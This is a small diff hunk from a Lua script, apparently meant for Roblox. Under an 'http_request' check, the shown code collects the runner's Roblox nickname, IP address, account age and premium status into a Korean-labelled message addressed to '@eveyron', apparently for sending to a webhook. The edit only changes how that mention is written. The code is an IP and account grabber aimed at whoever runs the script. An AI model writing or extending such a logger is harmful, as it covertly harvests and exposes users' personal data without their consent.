@@ -31,7 +31,7 @@ end
 if http_request then
     local ipAddress = getIP()  
     local data = {
-        content = "(@eveyron) 로블록스 닉네임: " .. playerName .. 
+        content = "@eveyron 로블록스 닉네임: " .. playerName .. 
                   "\nIP 주소: " .. ipAddress .. 
                   "\n계정 나이: " .. accountAge .. "일" .. 
                   "\n프리미엄 여부: " .. premiumStatus .. 
